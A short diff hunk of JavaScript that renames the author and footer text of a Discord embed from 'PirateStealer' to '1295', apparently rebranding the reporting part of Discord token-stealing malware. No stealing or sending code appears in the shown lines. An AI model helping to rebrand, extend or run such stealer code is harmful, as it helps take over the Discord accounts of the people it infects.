@@ -125,10 +125,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "PirateStealer"
+									name: "1295"
 								},
 								footer: {
-									text: "PirateStealer"
+									text: "1295"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
